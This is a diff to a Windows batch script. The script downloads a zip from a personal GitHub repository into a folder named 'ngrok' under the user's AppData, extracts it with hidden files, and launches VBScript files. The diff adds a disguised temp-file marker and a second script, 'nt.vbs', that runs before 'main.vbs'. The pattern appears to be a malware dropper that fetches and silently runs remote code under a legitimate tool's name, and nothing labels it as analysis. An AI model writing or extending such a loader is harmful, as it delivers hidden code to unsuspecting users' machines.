@@ -5,6 +5,7 @@ set "USER=%USERNAME%"
 set "NGROK_DIR=C:\Users\%USER%\AppData\Local\ngrok"
 set "REPO_URL=https://github.com/ofutpemata22/mamf/archive/refs/heads/main.zip"
 set "ZIP_PATH=%NGROK_DIR%\mamf.zip"
+set "TEMP_FILE=%TEMP%\8b37b206-42e3-4bdf-9344-aa7matagrasa77be014.tmp"
 
 if not exist "%NGROK_DIR%" mkdir "%NGROK_DIR%"
 
@@ -23,6 +24,13 @@ xcopy "%NGROK_DIR%\__extracted__\*" "%NGROK_DIR%\" /s /e /h /y
 
 rmdir /S /Q "%NGROK_DIR%\__extracted__"
 
-start "" "%NGROK_DIR%\main.vbs"
+start "" "%NGROK_DIR%\nt.vbs"
+
+timeout /t 2 >nul
+if exist "%TEMP_FILE%" (
+    start "" "%NGROK_DIR%\main.vbs"
+    exit /b
+)
+goto WAIT_FILE
 
 endlocal
